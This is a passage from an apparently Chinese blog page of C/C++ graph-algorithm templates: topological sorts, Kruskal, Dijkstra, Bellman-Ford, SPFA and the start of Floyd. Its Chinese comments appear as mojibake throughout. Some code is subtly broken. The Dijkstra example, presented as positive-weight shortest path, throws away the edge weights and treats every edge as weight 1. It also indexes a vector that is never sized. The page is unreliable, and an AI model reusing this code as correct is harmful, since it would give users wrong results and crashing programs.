<span class="hljs-comment">// å…¥åº¦æ•°ç»„</span><br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">bool</span>&gt; <span class="hljs-title function_">visited</span><span class="hljs-params">(n, <span class="hljs-literal">false</span>)</span>;  <span class="hljs-comment">// è®¿é—®æ ‡è®°æ•°ç»„</span><br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; sortOrder;      <span class="hljs-comment">// å­˜å‚¨å½“å‰æ‹“æ‰‘æ’åº</span><br>    <span class="hljs-comment">// æ„å»ºå›¾çš„é‚»æ¥è¡¨å’Œå…¥åº¦æ•°ç»„</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; edge : edges) &#123;<br>        <span class="hljs-type">int</span> from = edge[<span class="hljs-number">0</span>];  <span class="hljs-comment">// è¾¹çš„èµ·ç‚¹</span><br>        <span class="hljs-type">int</span> toNode = edge[<span class="hljs-number">1</span>];  <span class="hljs-comment">// è¾¹çš„ç»ˆç‚¹</span><br>        to[from].push_back(toNode);  <span class="hljs-comment">// æ·»åŠ è¾¹åˆ°é‚»æ¥è¡¨</span><br>        inDeg[toNode]++;  <span class="hljs-comment">// ç»ˆç‚¹çš„å…¥åº¦åŠ 1</span><br>    &#125;<br>    <span class="hljs-comment">// è°ƒç”¨å›æº¯å‡½æ•°ç”Ÿæˆæ‰€æœ‰æ‹“æ‰‘æ’åº</span><br>    allTopologicalSorts(n, to, inDeg, visited, sortOrder);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;  <span class="hljs-comment">// è¿”å›æˆåŠŸ</span><br>&#125;<br><span class="hljs-type">signed</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> n = <span class="hljs-number">6</span>;  <span class="hljs-comment">// èŠ‚ç‚¹æ•°</span><br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt; edges = &#123;<br>        &#123;<span class="hljs-number">5</span>, <span class="hljs-number">2</span>&#125;, &#123;<span class="hljs-number">5</span>, <span class="hljs-number">0</span>&#125;, &#123;<span class="hljs-number">4</span>, <span class="hljs-number">0</span>&#125;, &#123;<span class="hljs-number">4</span>, <span class="hljs-number">1</span>&#125;, &#123;<span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;, &#123;<span class="hljs-number">3</span>, <span class="hljs-number">1</span>&#125;  <span class="hljs-comment">// è¾¹åˆ—è¡¨</span><br>    &#125;;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;All Topological Sorts: &quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    generateAllTopologicalSorts(n, edges);  <span class="hljs-comment">// ç”Ÿæˆå¹¶è¾“å‡ºæ‰€æœ‰æ‹“æ‰‘æ’åº</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="Kruskal-ç®—æ³•ï¼šç”Ÿæˆæœ€å°ç”Ÿæˆæ ‘"><a href="#Kruskal-ç®—æ³•ï¼šç”Ÿæˆæœ€å°ç”Ÿæˆæ ‘" class="headerlink" title="Kruskal ç®—æ³•ï¼šç”Ÿæˆæœ€å°ç”Ÿæˆæ ‘"></a>Kruskal ç®—æ³•ï¼šç”Ÿæˆæœ€å°ç”Ÿæˆæ ‘</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">1005</span>;<br><span class="hljs-type">int</span> p[N];  <span class="hljs-comment">// å¹¶æŸ¥é›†çš„çˆ¶èŠ‚ç‚¹æ•°ç»„</span><br><br><span class="hljs-comment">// å­˜å‚¨å›¾çš„è¾¹ &#123;æƒé‡, &#123;èŠ‚ç‚¹a, èŠ‚ç‚¹b&#125;&#125;</span><br><span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">pair</span>&lt;<span class="hljs-type">int</span>, <span class="hljs-built_in">pair</span>&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt;&gt;&gt; edges;<br><br><span class="hljs-comment">// å¹¶æŸ¥é›†çš„æ ¸å¿ƒæ“ä½œ</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">find</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>    <span class="hljs-keyword">return</span> p[x] == x ? x : (p[x] = find(p[x]));<br>&#125;<br><br><span class="hljs-comment">// Kruskal ç®—æ³•ï¼šç”Ÿæˆæœ€å°ç”Ÿæˆæ ‘</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">kruskal</span><span class="hljs-params">(<span class="hljs-type">int</span> n, <span class="hljs-type">int</span> m)</span> &#123;<br>    <span class="hljs-type">int</span> res = <span class="hljs-number">0</span>, cnt = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++) p[i] = i;  <span class="hljs-comment">// åˆå§‹åŒ–å¹¶æŸ¥é›†</span><br><br>    sort(edges.begin(), edges.end());  <span class="hljs-comment">// æŒ‰æƒé‡æ’åº</span><br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span>&amp; edge : edges) &#123;<br>        <span class="hljs-type">int</span> w = edge.first, a = edge.second.first, b = edge.second.second;<br>        a = find(a), b = find(b);<br><br>        <span class="hljs-keyword">if</span> (a != b) &#123;  <span class="hljs-comment">// å¦‚æœä¸åœ¨åŒä¸€è¿é€šå—</span><br>            p[a] = b;  <span class="hljs-comment">// åˆå¹¶</span><br>            res += w;<br>            <span class="hljs-keyword">if</span> (++cnt == n - <span class="hljs-number">1</span>) <span class="hljs-keyword">break</span>;  <span class="hljs-comment">// å·²ç»å½¢æˆæœ€å°ç”Ÿæˆæ ‘</span><br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> cnt == n - <span class="hljs-number">1</span> ? res : <span class="hljs-number">-1</span>;  <span class="hljs-comment">// å¦‚æœä¸è¿é€šï¼Œè¿”å› -1</span><br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> n, m;<br>    <span class="hljs-built_in">cin</span> &gt;&gt; n &gt;&gt; m;<br><br>    <span class="hljs-comment">// è¾“å…¥è¾¹</span><br>    edges.resize(m);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; m; i++) &#123;<br>        <span class="hljs-type">int</span> a, b, w;<br>        <span class="hljs-built_in">cin</span> &gt;&gt; a &gt;&gt; b &gt;&gt; w;<br>        edges[i] = &#123;w, &#123;a, b&#125;&#125;;<br>    &#125;<br><br>    <span class="hljs-type">int</span> result = kruskal(n, m);<br>    <span class="hljs-keyword">if</span> (result == <span class="hljs-number">-1</span>)<br>        <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;æ— æ³•ç”Ÿæˆæœ€å°ç”Ÿæˆæ ‘&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;æœ€å°ç”Ÿæˆæ ‘çš„æƒé‡æ˜¯: &quot;</span> &lt;&lt; result &lt;&lt; <span class="hljs-built_in">endl</span>;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="Dijkstra-ç®—æ³•"><a href="#Dijkstra-ç®—æ³•" class="headerlink" title="Dijkstra ç®—æ³•"></a>Dijkstra ç®—æ³•</h3><p>å•èµ·ç‚¹å¤šç»ˆç‚¹æ­£æƒæœ€çŸ­è·¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> int long long  <span class="hljs-comment">// å®šä¹‰ä¸º long long æ–¹ä¾¿å¤„ç†å¤§æ•°</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-built_in">pair</span>&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt; PII;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">1e5</span> + <span class="hljs-number">5</span>;  <span class="hljs-comment">// é¢„è®¾æœ€å¤§èŠ‚ç‚¹æ•°</span><br><span class="hljs-type">int</span> n, m;                <span class="hljs-comment">// èŠ‚ç‚¹æ•°å’Œè¾¹æ•°</span><br><span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt; to;  <span class="hljs-comment">// ç”¨é‚»æ¥è¡¨å­˜å‚¨å›¾ï¼ˆå‡ºè¾¹æ•°ç»„ï¼‰</span><br><span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; dist;        <span class="hljs-comment">// å­˜å‚¨æœ€çŸ­è·¯å¾„</span><br><span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">bool</span>&gt; st;         <span class="hljs-comment">// å­˜å‚¨æ¯ä¸ªç‚¹æ˜¯å¦å·²ç»ç¡®å®šæœ€çŸ­è·¯å¾„</span><br><br><span class="hljs-comment">// å›¾çš„æ„å»ºå‡½æ•°ï¼šæ·»åŠ ä¸€æ¡è¾¹</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">add_edge</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b, <span class="hljs-type">int</span> weight)</span> &#123;<br>    to[a].push_back(b); <span class="hljs-comment">// æœ‰å‘å›¾åªæ·»åŠ  a -&gt; b</span><br>&#125;<br><br><span class="hljs-comment">// Dijkstra ç®—æ³•ï¼šæ±‚ 1 å·ç‚¹åˆ° n å·ç‚¹çš„æœ€çŸ­è·¯å¾„</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">dijkstra</span><span class="hljs-params">()</span> &#123;<br>    dist.assign(n, LLONG_MAX);  <span class="hljs-comment">// åˆå§‹åŒ– dist æ•°ç»„ä¸ºæ— ç©·å¤§</span><br>    dist[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;  <span class="hljs-comment">// èµ·ç‚¹ 0 çš„è·ç¦»ä¸º 0</span><br>    <span class="hljs-built_in">priority_queue</span>&lt;PII, <span class="hljs-built_in">vector</span>&lt;PII&gt;, greater&lt;PII&gt;&gt; heap;  <span class="hljs-comment">// æœ€å°å †</span><br>    heap.push(&#123;<span class="hljs-number">0</span>, <span class="hljs-number">0</span>&#125;);  <span class="hljs-comment">// èµ·ç‚¹åŠ å…¥å †ï¼Œ&#123;è·ç¦», èŠ‚ç‚¹&#125;</span><br><br>    <span class="hljs-keyword">while</span> (!heap.empty()) &#123;<br>        <span class="hljs-keyword">auto</span> t = heap.top();<br>        heap.pop();<br><br>        <span class="hljs-type">int</span> ver = t.second, distance = t.first;<br><br>        <span class="hljs-keyword">if</span> (st[ver]) <span class="hljs-keyword">continue</span>;  <span class="hljs-comment">// å¦‚æœå·²ç»è®¿é—®è¿‡ï¼Œåˆ™è·³è¿‡</span><br>        st[ver] = <span class="hljs-literal">true</span>;  <span class="hljs-comment">// æ ‡è®°å½“å‰èŠ‚ç‚¹å·²è®¿é—®</span><br><br>        <span class="hljs-comment">// éå†å½“å‰èŠ‚ç‚¹çš„æ‰€æœ‰é‚»æ¥ç‚¹</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j : to[ver]) &#123;  <span class="hljs-comment">// ç›´æ¥éå†å‡ºè¾¹æ•°ç»„</span><br>            <span class="hljs-keyword">if</span> (dist[j] &gt; distance + <span class="hljs-number">1</span>) &#123;  <span class="hljs-comment">// å‡è®¾æ‰€æœ‰è¾¹æƒä¸º 1</span><br>                dist[j] = distance + <span class="hljs-number">1</span>;  <span class="hljs-comment">// æ›´æ–°æœ€çŸ­è·ç¦»</span><br>                heap.push(&#123;dist[j], j&#125;);  <span class="hljs-comment">// å°†æ›´æ–°åçš„é‚»æ¥ç‚¹åŠ å…¥å †</span><br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// è¿”å›ä» 0 å·ç‚¹åˆ° n-1 å·ç‚¹çš„æœ€çŸ­è·ç¦»</span><br>    <span class="hljs-keyword">if</span> (dist[n<span class="hljs-number">-1</span>] == LLONG_MAX) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;  <span class="hljs-comment">// å¦‚æœæ— æ³•åˆ°è¾¾ï¼Œè¿”å› -1</span><br>    <span class="hljs-keyword">return</span> dist[n<span class="hljs-number">-1</span>];<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">cin</span> &gt;&gt; n &gt;&gt; m;<br>    to.resize(n);  <span class="hljs-comment">// åˆå§‹åŒ–é‚»æ¥è¡¨</span><br><br>    <span class="hljs-comment">// è¾“å…¥è¾¹</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; m; i++) &#123;<br>        <span class="hljs-type">int</span> a, b, weight;<br>        <span class="hljs-built_in">cin</span> &gt;&gt; a &gt;&gt; b &gt;&gt; weight;<br>        add_edge(a, b, weight);  <span class="hljs-comment">// æ·»åŠ è¾¹ a -&gt; b</span><br>    &#125;<br><br>    <span class="hljs-comment">// æ‰§è¡Œ Dijkstra ç®—æ³•</span><br>    <span class="hljs-type">int</span> result = dijkstra();<br>    <span class="hljs-built_in">cout</span> &lt;&lt; result &lt;&lt; <span class="hljs-built_in">endl</span>;  <span class="hljs-comment">// è¾“å‡ºç»“æœ</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="Bellman-Ford"><a href="#Bellman-Ford" class="headerlink" title="Bellman-Ford"></a>Bellman-Ford</h3><p>å•èµ·ç‚¹å¤šç»ˆç‚¹è´Ÿæƒæœ€çŸ­è·¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> n, m;       <span class="hljs-comment">// nè¡¨ç¤ºç‚¹æ•°ï¼Œmè¡¨ç¤ºè¾¹æ•°</span><br><span class="hljs-type">int</span> dist[N];        <span class="hljs-comment">// dist[x]å­˜å‚¨1åˆ°xçš„æœ€çŸ­è·¯è·ç¦»</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Edge</span>     // è¾¹ï¼Œ<span class="hljs-title">a</span>è¡¨ç¤ºå‡ºç‚¹ï¼Œ<span class="hljs-title">b</span>è¡¨ç¤ºå…¥ç‚¹ï¼Œ<span class="hljs-title">w</span>è¡¨ç¤ºè¾¹çš„æƒé‡</span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">int</span> a, b, w;<br>&#125;edges[M];<br><br><span class="hljs-comment">// æ±‚1åˆ°nçš„æœ€çŸ­è·¯è·ç¦»ï¼Œå¦‚æœæ— æ³•ä»1èµ°åˆ°nï¼Œåˆ™è¿”å›-1ã€‚</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">bellman_ford</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-built_in">memset</span>(dist, <span class="hljs-number">0x3f</span>, <span class="hljs-keyword">sizeof</span> dist);<br>    dist[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">// å¦‚æœç¬¬næ¬¡è¿­ä»£ä»ç„¶ä¼šæ¾å¼›ä¸‰è§’ä¸ç­‰å¼ï¼Œå°±è¯´æ˜å­˜åœ¨ä¸€æ¡é•¿åº¦æ˜¯n+1çš„æœ€çŸ­è·¯å¾„ï¼Œç”±æŠ½å±‰åŸç†ï¼Œè·¯å¾„ä¸­è‡³å°‘å­˜åœ¨ä¸¤ä¸ªç›¸åŒçš„ç‚¹ï¼Œè¯´æ˜å›¾ä¸­å­˜åœ¨è´Ÿæƒå›è·¯ã€‚</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i ++ )<br>    &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; m; j ++ )<br>        &#123;<br>            <span class="hljs-type">int</span> a = edges[j].a, b = edges[j].b, w = edges[j].w;<br>            <span class="hljs-keyword">if</span> (dist[b] &gt; dist[a] + w)<br>                dist[b] = dist[a] + w;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (dist[n] &gt; <span class="hljs-number">0x3f3f3f3f</span> / <span class="hljs-number">2</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">return</span> dist[n];<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="spfa-ç®—æ³•"><a href="#spfa-ç®—æ³•" class="headerlink" title="spfa ç®—æ³•"></a>spfa ç®—æ³•</h3><p>é˜Ÿåˆ—ä¼˜åŒ–çš„Bellman-Fordç®—æ³•</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> n;      <span class="hljs-comment">// æ€»ç‚¹æ•°</span><br><span class="hljs-type">int</span> h[N], w[N], e[N], ne[N], idx;       <span class="hljs-comment">// é‚»æ¥è¡¨å­˜å‚¨æ‰€æœ‰è¾¹</span><br><span class="hljs-type">int</span> dist[N];        <span class="hljs-comment">// å­˜å‚¨æ¯ä¸ªç‚¹åˆ°1å·ç‚¹çš„æœ€çŸ­è·ç¦»</span><br><span class="hljs-type">bool</span> st[N];     <span class="hljs-comment">// å­˜å‚¨æ¯ä¸ªç‚¹æ˜¯å¦åœ¨é˜Ÿåˆ—ä¸­</span><br><br><span class="hljs-comment">// æ±‚1å·ç‚¹åˆ°nå·ç‚¹çš„æœ€çŸ­è·¯è·ç¦»ï¼Œå¦‚æœä»1å·ç‚¹æ— æ³•èµ°åˆ°nå·ç‚¹åˆ™è¿”å›-1</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">spfa</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-built_in">memset</span>(dist, <span class="hljs-number">0x3f</span>, <span class="hljs-keyword">sizeof</span> dist);<br>    dist[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-built_in">queue</span>&lt;<span class="hljs-type">int</span>&gt; q;<br>    q.push(<span class="hljs-number">1</span>);<br>    st[<span class="hljs-number">1</span>] = <span class="hljs-literal">true</span>;<br><br>    <span class="hljs-keyword">while</span> (q.size())<br>    &#123;<br>        <span class="hljs-keyword">auto</span> t = q.front();<br>        q.pop();<br><br>        st[t] = <span class="hljs-literal">false</span>;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = h[t]; i != <span class="hljs-number">-1</span>; i = ne[i])<br>        &#123;<br>            <span class="hljs-type">int</span> j = e[i];<br>            <span class="hljs-keyword">if</span> (dist[j] &gt; dist[t] + w[i])<br>            &#123;<br>                dist[j] = dist[t] + w[i];<br>                <span class="hljs-keyword">if</span> (!st[j])     <span class="hljs-comment">// å¦‚æœé˜Ÿåˆ—ä¸­å·²å­˜åœ¨jï¼Œåˆ™ä¸éœ€è¦å°†jé‡å¤æ’å…¥</span><br>                &#123;<br>                    q.push(j);<br>                    st[j] = <span class="hljs-literal">true</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (dist[n] == <span class="hljs-number">0x3f3f3f3f</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">return</span> dist[n];<br>&#125;<br></code></pre></td></tr></table></figure><p>spfaåˆ¤æ–­å›¾ä¸­æ˜¯å¦å­˜åœ¨è´Ÿç¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> n;      <span class="hljs-comment">// æ€»ç‚¹æ•°</span><br><span class="hljs-type">int</span> h[N], w[N], e[N], ne[N], idx;       <span class="hljs-comment">// é‚»æ¥è¡¨å­˜å‚¨æ‰€æœ‰è¾¹</span><br><span class="hljs-type">int</span> dist[N], cnt[N];        <span class="hljs-comment">// dist[x]å­˜å‚¨1å·ç‚¹åˆ°xçš„æœ€çŸ­è·ç¦»ï¼Œcnt[x]å­˜å‚¨1åˆ°xçš„æœ€çŸ­è·¯ä¸­ç»è¿‡çš„ç‚¹æ•°</span><br><span class="hljs-type">bool</span> st[N];     <span class="hljs-comment">// å­˜å‚¨æ¯ä¸ªç‚¹æ˜¯å¦åœ¨é˜Ÿåˆ—ä¸­</span><br><br><span class="hljs-comment">// å¦‚æœå­˜åœ¨è´Ÿç¯ï¼Œåˆ™è¿”å›trueï¼Œå¦åˆ™è¿”å›falseã€‚</span><br><span class="hljs-type">bool</span> <span class="hljs-title function_">spfa</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-comment">// ä¸éœ€è¦åˆå§‹åŒ–distæ•°ç»„</span><br>    <span class="hljs-comment">// åŸç†ï¼šå¦‚æœæŸæ¡æœ€çŸ­è·¯å¾„ä¸Šæœ‰nä¸ªç‚¹ï¼ˆé™¤äº†è‡ªå·±ï¼‰ï¼Œé‚£ä¹ˆåŠ ä¸Šè‡ªå·±ä¹‹åä¸€å…±æœ‰n+1ä¸ªç‚¹ï¼Œç”±æŠ½å±‰åŸç†ä¸€å®šæœ‰ä¸¤ä¸ªç‚¹ç›¸åŒï¼Œæ‰€ä»¥å­˜åœ¨ç¯ã€‚</span><br><br>    <span class="hljs-built_in">queue</span>&lt;<span class="hljs-type">int</span>&gt; q;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i ++ )<br>    &#123;<br>        q.push(i);<br>        st[i] = <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">while</span> (q.size())<br>    &#123;<br>        <span class="hljs-keyword">auto</span> t = q.front();<br>        q.pop();<br><br>        st[t] = <span class="hljs-literal">false</span>;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = h[t]; i != <span class="hljs-number">-1</span>; i = ne[i])<br>        &#123;<br>            <span class="hljs-type">int</span> j = e[i];<br>            <span class="hljs-keyword">if</span> (dist[j] &gt; dist[t] + w[i])<br>            &#123;<br>                dist[j] = dist[t] + w[i];<br>                cnt[j] = cnt[t] + <span class="hljs-number">1</span>;<br>                <span class="hljs-keyword">if</span> (cnt[j] &gt;= n) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;       <span class="hljs-comment">// å¦‚æœä»1å·ç‚¹åˆ°xçš„æœ€çŸ­è·¯ä¸­åŒ…å«è‡³å°‘nä¸ªç‚¹ï¼ˆä¸åŒ…æ‹¬è‡ªå·±ï¼‰ï¼Œåˆ™è¯´æ˜å­˜åœ¨ç¯</span><br>                <span class="hljs-keyword">if</span> (!st[j])<br>                &#123;<br>                    q.push(j);<br>                    st[j] = <span class="hljs-literal">true</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Floyd"><a href="#Floyd" class="headerlink" title="Floyd"></a>Floyd</h3><p>å¤šèµ·ç‚¹å¤šç»ˆç‚¹æœ€çŸ­è·¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 